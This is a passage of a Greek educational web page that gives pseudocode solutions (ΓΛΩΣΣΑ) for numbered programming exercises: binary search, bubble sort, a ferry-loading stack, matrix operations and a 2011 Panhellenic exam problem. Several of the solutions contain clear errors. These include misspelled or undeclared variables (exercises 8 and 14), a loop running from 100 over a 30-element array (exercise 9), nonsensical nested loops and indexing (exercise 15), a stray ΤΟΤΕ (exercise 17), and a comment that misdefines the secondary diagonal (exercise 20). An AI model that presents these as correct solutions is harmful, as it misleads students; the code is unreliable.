&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-8">Άσκηση 8:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΚ108
​ΜΕΤΑΒΛΗΤΕΣ
ΑΚΕΡΑΙΕΣ: αρ,δεξ,μεσ,Α[60],ΑΡΙΘΜΟΣ
ΛΟΓΙΚΕΣ: βρ
ΑΡΧΗ
αρ &amp;lt;- 1
δεξ &amp;lt;- 60
βρ &amp;lt;-ΨΕΥΔΗΣ
θ &amp;lt;- 0
ΔΙΑΒΑΣΕ ΑΡΙΘΜΟΣ
ΟΣΟ αρ &amp;lt;= δεξ ΚΑΙ βρ=ΨΕΥΔΗΣ ΕΠΑΝΑΛΑΒΕ
μεσ &amp;lt;- (αρ + δεξ) DIV 2
ΑΝ Α[μεσ]&amp;lt; ΑΡΙΘΜΟΣ ΤΟΤΕ
αρ&amp;lt;- μεσ + 1
ΑΛΛΙΩΣ_ΑΝ Α[μεσ] &amp;gt; ΑΡΙΘΜΟΣ ΤΟΤΕ
δε&amp;lt;- μεσ -1
ΑΛΛΙΩΣ
βρ &amp;lt;- ΑΛΗΘΗΣ
θ&amp;lt;-μεσ
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΑΝ βρ=ΑΛΗΘΗΣ ΤΟΤΕ
ΓΡΑΨΕ &amp;#39;Ο ΑΡΙΘΜΟΣ &amp;#39;,ΑΡΙΘΜΟΣ, &amp;#39; ΒΡΕΘΗΚΕ ΣΤΗΝ ΘΕΣΗ: &amp;#39; ,θ
ΑΛΛΙΩΣ
ΓΡΑΨΕ ΄Ο ΑΡΙΘΜΟΣ &amp;#39;,ΑΡΙΘΜΟΣ, &amp;#39; ΔΕΝ ΥΠΑΡΧΕΙ&amp;#39;
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-9">Άσκηση 9:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ109
ΜΕΤΑΒΛΗΤΕΣ
ΑΚΕΡΑΙΕΣ: Α[30], i, j, K
ΛΟΓΙΚΕΣ: Flag
ΑΡΧΗ
ΓΙΑ i ΑΠΟ 1 ΜΕΧΡΙ 30
ΔΙΑΒΑΣΕ Α[i]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
Flag ← ΑΛΗΘΗΣ
i ← 2
ΟΣΟ i &amp;lt;= 30 ΚΑΙ flag = ΑΛΗΘΗΣ ΕΠΑΝΑΛΑΒΕ
flag ← ΨΕΥΔΗΣ
ΓΙΑ j ΑΠΟ 100 ΜΕΧΡΙ i ΜΕ_ΒΗΜΑ -1
ΑΝ Α[j-1] &amp;gt; A[j] ΤΟΤΕ
Κ ← Α[j - 1]
Α[j-1] ← Α[j]
Α[j] ← Κ
flag ← ΑΛΗΘΗΣ
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
i ← i + 1
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΙΑ i ΑΠΟ 1 ΜΕΧΡΙ 30
ΓΡΑΨΕ Α[i]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="θέμα-γ-2011-πανελλήνιες">Θέμα Γ 2011 Πανελλήνιες:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΘΕΜΑ_Γ_2011_ΗΜΕΡ
ΜΕΤΑΒΛΗΤΕΣ
ΑΚΕΡΑΙΕΣ: i, S, ΒΑΘ[3], ελάχιστο, μέγιστο
ΛΟΓΙΚΕΣ: επιτυχών
ΧΑΡΑΚΤΗΡΕΣ: ΟΝΟΜΑ, Όνομα_ελάχιστο
ΑΡΧΗ
ελάχιστο &amp;lt;-- 1000 ! ελάχιστη συνολική βαθμολογία επιτυχόντα
! αρχική τιμή αρκετά μεγάλη ώστε να αλλάξει (βλ.παρ.3, κεφ2)
ΓΡΑΨΕ &amp;#39;ΔΩΣΤΕ ΟΝΟΜΑ ΥΠΟΨΗΦΙΟΥ&amp;#39;
ΔΙΑΒΑΣΕ ΟΝΟΜΑ
ΟΣΟ ΟΝΟΜΑ &amp;lt;&amp;gt; &amp;#39;ΤΕΛΟΣ&amp;#39; ΕΠΑΝΑΛΑΒΕ ! Γ4
! Γ1
ΓΡΑΨΕ &amp;#39;ΔΩΣΤΕ ΒΑΘΜΟΥΣ (3)&amp;#39;
ΓΙΑ i ΑΠΟ 1 ΜΕΧΡΙ 3
ΔΙΑΒΑΣΕ ΒΑΘ[i]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
! Γ2
! εύρεση μέγιστου σε πίνακα
μέγιστο &amp;lt;-- ΒΑΘ[1]
ΓΙΑ i ΑΠΟ 2 ΜΕΧΡΙ 3
ΑΝ ΒΑΘ[i]&amp;gt;μέγιστο ΤΟΤΕ
μέγιστο &amp;lt;-- ΒΑΘ[i]
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΡΑΨΕ &amp;#39;ΜΕΓΑΛΥΤΕΡΟΣ ΒΑΘΜΟΣ &amp;#39;, μέγιστο
! Γ3
! αν έστω ένας βαθμός κάτω του 50, απορρίπτεται ο υποψήφιος
επιτυχών &amp;lt;-- ΑΛΗΘΗΣ
i &amp;lt;-- 1
ΟΣΟ i &amp;lt;= 3 ΚΑΙ επιτυχών = ΑΛΗΘΗΣ ΕΠΑΝΑΛΑΒΕ
ΑΝ ΒΑΘ[i]&amp;lt;50 ΤΟΤΕ
επιτυχών &amp;lt;-- ΨΕΥΔΗΣ
ΤΕΛΟΣ_ΑΝ
i &amp;lt;-- i+1
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
! υπολογισμός συνολικής βαθμολογίας επιτυχόντα
ΑΝ επιτυχών=ΑΛΗΘΗΣ ΤΟΤΕ
S &amp;lt;-- 0
ΓΙΑ i ΑΠΟ 1 ΜΕΧΡΙ 3
S &amp;lt;-- S + ΒΑΘ[i]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΑΝ
! Αν MO κάτω του 55, απορρίπτεται ο υποψήφιος
ΑΝ επιτυχών=ΑΛΗΘΗΣ ΤΟΤΕ
ΑΝ S/3 &amp;lt; 55 ΤΟΤΕ
επιτυχών &amp;lt;-- ΨΕΥΔΗΣ
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΑΝ
! όνομα και σύνολική βαθμολογία επιτυχόντα
ΑΝ επιτυχών=ΑΛΗΘΗΣ ΤΟΤΕ
ΓΡΑΨΕ &amp;#39;ΕΠΙΤΥΧΩΝ&amp;#39;, ΟΝΟΜΑ, S
ΤΕΛΟΣ_ΑΝ
! Γ5
! υπολογισμός ελάχιστης βαθμολογίας επιτυχόντων
ΑΝ επιτυχών=ΑΛΗΘΗΣ ΤΟΤΕ
ΑΝ S &amp;lt; ελάχιστο ΤΟΤΕ
ελάχιστο &amp;lt;-- S
Όνομα_ελάχιστο &amp;lt;-- ΟΝΟΜΑ
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΑΝ
ΓΡΑΨΕ &amp;#39;ΔΩΣΤΕ ΟΝΟΜΑ ΥΠΟΨΗΦΙΟΥ&amp;#39;
ΔΙΑΒΑΣΕ ΟΝΟΜΑ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΑΝ ελάχιστο&amp;lt;&amp;gt;1000 ΤΟΤΕ ! Περίπτωση να μη έχει γίνει εισαγωγή
ΓΡΑΨΕ &amp;#39;ΥΠΟΨΗΦΙΟΣ ΜΕ ΤΗΝ ΜΙΚΡΟΤΕΡΗ ΒΑΘΜΟΛΟΓΙΑ&amp;#39;
ΓΡΑΨΕ Όνομα_ελάχιστο, ελάχιστο
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-11">Άσκηση 11:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ11
ΜΕΤΑΒΛΗΤΕΣ
ΑΚΕΡΑΙΕΣ: τοπ, επ1, πλ
ΧΑΡΑΚΤΗΡΕΣ: επ2, αρ, π[250]
ΑΡΧΗ
τοπ &amp;lt;- 0
ΑΡΧΗ_ΕΠΑΝΑΛΗΨΗΣ
ΓΡΑΨΕ &amp;#39; Μενού Επιλογών&amp;#39;
ΓΡΑΨΕ &amp;#39; 1. Επιβίβαση&amp;#39;
ΓΡΑΨΕ &amp;#39; 2. Αποβίβαση&amp;#39;
ΓΡΑΨΕ &amp;#39; 3. Έξοδος&amp;#39;
ΓΡΑΨΕ &amp;#39; Δώσε επιλογή:&amp;#39;
ΔΙΑΒΑΣΕ επ1
ΑΝ επ1 = 1 ΤΟΤΕ
ΑΡΧΗ_ΕΠΑΝΑΛΗΨΗΣ
ΑΡΧΗ_ΕΠΑΝΑΛΗΨΗΣ
ΓΡΑΨΕ &amp;#39; Υπάρχει αυτοκίνητο για επιβίβαση (Ν/Ο);&amp;#39;
ΔΙΑΒΑΣΕ επ2
ΑΝ επ2 &amp;lt;&amp;gt; &amp;#39;Ν&amp;#39; ΚΑΙ επ2 &amp;lt;&amp;gt; &amp;#39;ν&amp;#39; ΚΑΙ επ2 &amp;lt;&amp;gt; &amp;#39;Ο&amp;#39; ΚΑΙ επ2 &amp;lt;&amp;gt; &amp;#39;ο&amp;#39; ΤΟΤΕ
ΓΡΑΨΕ &amp;#39;Λάθος επιλογή. Ξαναπροσπάθησε!!!&amp;#39;
ΤΕΛΟΣ_ΑΝ
ΜΕΧΡΙΣ_ΟΤΟΥ επ2 = &amp;#39;Ο&amp;#39; Η επ2 = &amp;#39;ο&amp;#39; Η επ2 = &amp;#39;Ν&amp;#39; Η επ2 = &amp;#39;ν&amp;#39;
ΑΝ επ2 = &amp;#39;Ν&amp;#39; Η επ2 = &amp;#39;ν&amp;#39; ΤΟΤΕ
ΑΝ τοπ &amp;lt; 250 ΤΟΤΕ
ΓΡΑΨΕ &amp;#39;Δώσε αριθμό κυκλοφορίας του αυτοκινήτου:&amp;#39;
ΔΙΑΒΑΣΕ αρ
τοπ &amp;lt;- τοπ + 1
π[τοπ] &amp;lt;- αρ
ΑΝ τοπ = 250 ΤΟΤΕ
ΓΡΑΨΕ &amp;#39;Το πλοίο γέμισε και δεν χωρά άλλα αμάξια&amp;#39;
ΤΕΛΟΣ_ΑΝ
ΑΛΛΙΩΣ
ΓΡΑΨΕ &amp;#39;Το πλοίο είναι γεμάτο&amp;#39;
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΑΝ
ΜΕΧΡΙΣ_ΟΤΟΥ τοπ = 250 Η επ2 = &amp;#39;Ο&amp;#39; Η επ2 = &amp;#39;ο&amp;#39;
ΑΛΛΙΩΣ_ΑΝ επ1 = 2 ΤΟΤΕ
πλ &amp;lt;- 0
ΟΣΟ τοπ &amp;gt;= 1 ΕΠΑΝΑΛΑΒΕ
ΓΡΑΨΕ &amp;#39;Αποβιβάζεται το αυτοκίνητο με αριθμό κυκλοφορίας:&amp;#39;, π[τοπ]
π[τοπ] &amp;lt;- &amp;#39; &amp;#39;
τοπ &amp;lt;- τοπ - 1
πλ &amp;lt;- πλ + 1
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΡΑΨΕ &amp;#39;Πλήθος οχημάτων που αποβιβάστηκαν στο λιμάνι της ΑΙΓΙΝΑΣ:&amp;#39;, πλ
ΤΕΛΟΣ_ΑΝ
ΜΕΧΡΙΣ_ΟΤΟΥ επ1 = 3
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-12">Άσκηση 12:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ12
ΜΕΤΑΒΛΗΤΕΣ:
ΧΑΡΑΚΤΗΡΕΣ: ΟΝΟΜΑ_ΟΜΑΔΑΣ[20] , ΟΝΟΜΑ_ΠΑΙΚΤΗ[20,10]
ΑΚΕΡΑΙΟΙ: Ι,Ζ
ΑΡΧΗ
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 20
ΔΙΑΒΑΣΕ ΟΝΟΜΑ_ΟΜΑΔΑΣ[Ι]
ΓΙΑ Ζ ΑΠΟ 1 ΜΕΧΡΙ 10
ΔΙΑΒΑΣΕ ΟΝΟΜΑ_ΠΑΙΚΤΗ[Ι,Ζ]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 20
ΓΡΑΨΕ ΟΝΟΜΑ_ΟΜΑΔΑΣ[Ι]
ΓΙΑ Ζ ΑΠΟ 1 ΜΕΧΡΙ 10
ΓΡΑΨΕ ΟΝΟΜΑ_ΠΑΙΚΤΗ[Ι,Ζ]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-13">Άσκηση 13:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ13
ΜΕΤΑΒΛΗΤΕΣ:
ΧΑΡΑΚΤΗΡΕΣ: ΟΝΟΜΑ[25] ,SWAP1
ΠΡΑΓΜΑΤΙΚΕΣ: ΘΕΡΜΟΚΡΑΣΙΑ[25][12],ΣΥΝΟΛΟ[25],SWAP
ΑΚΕΡΑΙΕΣ : Ι,Ζ
ΑΡΧΗ
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 25
ΔΙΑΒΑΣΕ ΟΝΟΜΑ[Ι]
ΓΙΑ Ζ ΑΠΟ 1 ΜΕΧΡΙ 12
ΔΙΑΒΑΣΕ ΘΕΡΜΟΚΡΑΣΙΑ[Ι][Ζ]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 25
ΣΥΝΟΛΟ[Ι]=0
ΓΙΑ Ζ ΑΠΟ 1 ΜΕΧΡΙ 12
ΣΥΝΟΛΟ[Ι]= ΣΥΝΟΛΟ[Ι]+ΘΕΡΜΟΚΡΑΣΙΑ[Ι][Ζ]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΣΥΝΟΛΟ[Ι]= ΣΥΝΟΛΟ[Ι]/12
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΙΑ Ι ΑΠΟ 2 ΜΕΧΡΙ 12
ΓΙΑ Ζ ΑΠΟ 12 ΜΕΧΡΙ Ι ΜΕ ΒΗΜΑ_-1
ΑΝ ΣΥΝΟΛΟ[Ζ]&amp;gt;ΣΥΝΟΛΟ[Ζ-1] ΤΟΤΕ
SWAP = ΣΥΝΟΛΟ[Ζ]
ΣΥΝΟΛΟ[Ζ]=ΣΥΝΟΛΟ[Ζ-1]
ΣΥΝΟΛΟ[Ζ-1]=SWAP
SWAP1=ΟΝΟΜΑ[Ζ]
ΟΝΟΜΑ[Ζ]=ΟΝΟΜΑ[Ζ-1]
ΟΝΟΜΑ[Ζ-1]=SWAP1
TEΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 25
ΓΡΑΨΕ ΟΝΟΜΑ[Ι]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-14">Άσκηση 14:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ14:
ΜΕΤΑΒΛΗΤΕΣ:
ΠΡΑΓΜΑΤΙΚΟΙ:
ΑΚΕΡΑΙΟΙ:Χ,Ι,Ζ,Κ
ΧΑΡΑΚΤΗΡΕΣ: ΟΝΟΜΑ[3][17] ,ΟΝΟΜΑΤΟΠ3[9]
ΑΡΧΗ
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 3
ΓΙΑ Ζ ΑΠΟ 1 ΜΕΧΡΙ 17
ΔΙΑΒΑΣΕ ΟΝΟΜΑ[Ι][Ζ],ΒΑΘΜΟΣ[Ι][Ζ]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 3
ΓΙΑ Ζ ΑΠΟ 2 ΜΕΧΡΙ 17
ΓΙΑ Κ ΑΠΟ 17 ΜΕΧΡΙ Ζ ΜΕ ΒΗΜΑ -1
ΑΝ ΒΑΘΜΟΣ[Ι][Κ]&amp;gt;ΒΑΘΜΟΣ[Ι][Κ-1] ΤΟΤΕ
SWAP = ΒΑΘΜΟΣ[Ι][Κ-1]
ΒΑΘΜΟΣ[Ι][Κ-1]= ΒΑΘΜΟΣ[Ι][Κ]
ΒΑΘΜΟΣ[Ι][Κ]= SWAP
SWAP1= ΟΝΟΜΑ[Ι][Κ-1]
ΟΝΟΜΑ[Ι][Κ-1]=ΟΝΟΜΑ[Ι][Κ]
ΟΝΟΜΑ[Ι][Κ] = SWAP1
TEΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
Χ=1
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ 3
ΓΙΑ Ζ ΑΠΟ 1 ΜΕΧΡΙ 3 !Διότι θα μπορούσε οι 3 μεγαλύτεροι βαθμοί να είναι από το ίδιο σχολείο. Άρα, θα πάρουμε τους 3 μεγαλύτερους βαθμούς από κάθε σχολείο.
ΒΑΘΜΟΣΤΟΠ3[Χ]=ΒΑΘΜΟΣ[Ι][Ζ] !Παίρνουμε τους 3 καλύτερους βαθμούς από κάθε σχολείο ,και τους βάζουμε σε ένα μονοδιάστατο πίνακα ,ώστε να ξανακάνουμε ταξινόμηση και να βρούμε τους 3 μεγαλύτερους βαθμούς.
ΟΝΟΜΑΤΟΠ3[Χ]=ΟΝΟΜΑ[Ι][Ζ]
Χ=Χ+1
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΙΑ Χ ΑΠΟ 1 ΜΕΧΡΙ 9
ΑΝ ΒΑΘΜΟΣΤΟΠ3[Χ]&amp;gt;ΒΑΘΜΟΣΤΟΠ3[Χ-1] ΤΟΤΕ
SWAP = ΒΑΘΜΟΣΤΟΠ3[Χ-1]
ΒΑΘΜΟΣΤΟΠ3[Χ-1]= ΒΑΘΜΟΣΤΟΠ3[Χ]
ΒΑΘΜΟΣΤΟΠ3[Χ]= SWAP
SWAP1= ΟΝΟΜΑΤΟΠ3[Χ-1]
ΟΝΟΜΑΤΟΠ3[Χ-1]=ΟΝΟΜΑΤΟΠ3[Χ]
ΟΝΟΜΑΤΟΠ3[Χ] = SWAP1
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΙΑ Χ ΑΠΟ 1 ΜΕΧΡΙ 3
ΓΡΑΨΕ ΟΝΟΜΑΤΟΠ3[Χ]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-15">Άσκηση 15:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ15:
ΜΕΤΑΒΛΗΤΕΣ:
ΠΡΑΓΜΑΤΙΚΟΙ:
ΑΚΕΡΑΙΟΙ: Ι , ,ΝΕΟΣΠΙΝΑΚΑΣ[Ν][Ν],ΠΙΝΑΚΑΣ1[Ν][Ν],ΠΙΑΝΑΚΣ2[Ν][Ν],SWAP
ΧΑΡΑΚΤΗΡΕΣ:
ΑΡΧΗ:
ΓΙΑ Α ΑΠΟ 1 ΜΕΧΡΙ Ν
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ Ν
ΝΕΟΠΙΝΑΚΑΣ[Α][Ι] = ΠΙΝΑΚΑΣ1[Ι]+ΠΙΝΑΚΑΣ2[Ι]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ Ν
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ Ν
ΑΝ ΝΕΟΠΙΝΑΚΑΣ[Α][Ι]&amp;lt;ΝΕΟΠΙΝΑΚΑΣ[Α][Ι] ΤΟΤΕ
SWAP= ΝΕΟΠΙΝΑΚΑΣ[Α][Ι]
ΝΕΟΠΙΝΑΚΑΣ[Α][Ι]=ΝΕΟΠΙΝΑΚΑΣ[Α][Ι-1]
ΝΕΟΠΙΝΑΚΑΣ[Α][Ι-1]=SWAP
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-16">Άσκηση 16:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ16:
ΜΕΤΑΒΛΗΤΕΣ:
ΠΡΑΓΜΑΤΙΚΟΙ:
ΑΚΕΡΑΙΟΙ: Ι ,Α ,ΝΕΟΣΠΙΝΑΚΑΣ[2Ν][Ν],ΠΙΝΑΚΑΣ1[Ν][Ν],ΠΙΑΝΑΚΣ2[Ν][Ν]
ΧΑΡΑΚΤΗΡΕΣ:
ΑΡΧΗ:
ΓΙΑ Α ΑΠΟ 1 ΜΕΧΡΙ Ν
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ Ν
ΝΕΟΠΙΝΑΚΑΣ[Α][Ι] = ΠΙΝΑΚΑΣ1[Α][Ι]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
Α=Α+1 !Διότι θέλουμε να κρατήσουμε την γραμμή και να πάμε στην ακριβώς επόμενη για να συνεχίσουμε να γεμίζουμε τον νέο πίνακα με τα στοιχεία και του 2ου πίνακα
ΓΙΑ Ζ ΑΠΟ 1 ΜΕΧΡΙ Ν
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ Ν
ΝΕΟΠΙΝΑΚΑΣ[Α][Ι]=ΠΙΝΑΚΑ2Σ[Ζ][Ι]
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
Α=Α+1
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-17">Άσκηση 17:&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-ΠΡΟΓΡΑΜΜΑ" data-lang="ΠΡΟΓΡΑΜΜΑ">ΜΕΤΑΒΛΗΤΕΣ:
ΠΡΑΓΜΑΤΙΚΟΙ:
ΑΚΕΡΑΙΟΙ: Ι , ,Α,ΠΙΝΑΚΑΣ1[Ν][Ν],ΠΙΑΝΑΚΣ2[Ν][Ν],ΣΥΝΟΛΙΚΑ
ΧΑΡΑΚΤΗΡΕΣ:
ΑΡΧΗ:
ΓΙΑ Α ΑΠΟ 1 ΜΕΧΡΙ Ν
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ Ν
ΠΙΝΑΚΑΣ1[Α][Ι]=ΠΙΝΑΚΑΣ2[Α][Ι] ΤΟΤΕ
ΣΥΝΟΛΙΚΑ=ΣΥΝΟΛΙΚΑ+1
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΑΝ ΣΥΝΟΛΙΚΑ=Ν*Ν ΤΟΤΕ
ΓΡΑΨΕ &amp;#34;Οι πίνακες είναι ίσοι&amp;#34;
ΑΛΛΙΩΣ
ΓΡΑΨΕ &amp;#34;Το ποσοστό ίσων στοιχείων είναι &amp;#34; , (ΣΥΝΟΛΙΚΑ/(Ν*Ν))*100
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-18">Άσκηση 18:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ18
ΜΕΤΑΒΛΗΤΕΣ:
ΑΚΕΡΑΙΕΣ: Ι,Ζ
ΠΡΑΓΜΑΤΙΚΕΣ: Α[Ν,Ν] , Β[Ν,Ν] , Γ[Ν,Ν] ,ΣΥΝΟΛΟ ,
ΑΡΧΗ
...
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ Ν
ΓΙΑ Ζ ΑΠΟ 1 ΜΕΧΡΙ Ν
ΣΥΝΟΛΟ = 0
#ΥΠΟΛΟΓΙΣΜΟΣ ΜΕΣΟΥ ΟΡΟΥ ΤΟΥ ΚΆΘΕ ΚΕΛΙΟΥ ΤΟΥ ΚΆΘΕ ΠΙΝΑΚΑ
ΣΥΝΟΛΟ= ( Α[Ι,Ζ] + Β[Ι,Ζ] )/2
Γ[Ι,Ζ] = ΣΥΝΟΛΟ # Η ΝΕΑ ΤΙΜΗ ΣΤΟΝ ΝΈΟ ΠΙΝΑΚΑ Γ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΡΑΨΕ ΣΥΝΟΛΟ
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-19">Άσκηση 19:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ19
ΜΕΤΑΒΛΗΤΕΣ:
ΑΚΕΡΑΙΕΣ: Ι,Ζ
ΠΡΑΓΜΑΤΙΚΕΣ: Α[Ν,Ν] ,ΑΘΡΟΙΣΜΑ ,
ΑΡΧΗ
...
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ Ν
ΓΙΑ Ζ ΑΠΟ 1 ΜΕΧΡΙ Ν
ΑΝ Ι=Ζ ΤΟΤΕ: ! ΚΥΡΙΑ ΔΙΑΓΩΝΙΟΣ ΕΊΝΑΙ ΌΤΑΝ Ι=Ζ
ΑΘΡΟΙΣΜΑ= ΑΘΡΟΙΣΜΑ + Α[Ι,Ζ]
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΡΑΨΕ ΑΘΡΟΙΣΜΑ
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="άσκηση-20">Άσκηση 20:&lt;/h2>
&lt;pre tabindex="0">&lt;code>ΠΡΟΓΡΑΜΜΑ ΑΣΚ20
ΜΕΤΑΒΛΗΤΕΣ:
ΑΚΕΡΑΙΕΣ: Ι,Ζ
ΠΡΑΓΜΑΤΙΚΕΣ: Α[Ν,Ν] ,ΑΘΡΟΙΣΜΑ ,
ΑΡΧΗ
...
ΓΙΑ Ι ΑΠΟ 1 ΜΕΧΡΙ Ν
ΓΙΑ Ζ ΑΠΟ 1 ΜΕΧΡΙ Ν
ΑΝ Ι=Ζ ΤΟΤΕ:
!ΔΕΥΤΕΡΕΥΟΥΣΑ ΔΙΑΓΩΝΙΟΣ ΕΊΝΑΙ ΌΤΑΝ Ι=Ζ
ΑΘΡΟΙΣΜΑ= ΑΘΡΟΙΣΜΑ + Α[Ι,Ν+1-Ζ]
ΤΕΛΟΣ_ΑΝ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΤΕΛΟΣ_ΕΠΑΝΑΛΗΨΗΣ
ΓΡΑΨΕ ΑΘΡΟΙΣΜΑ
ΤΕΛΟΣ_ΠΡΟΓΡΑΜΜΑΤΟΣ
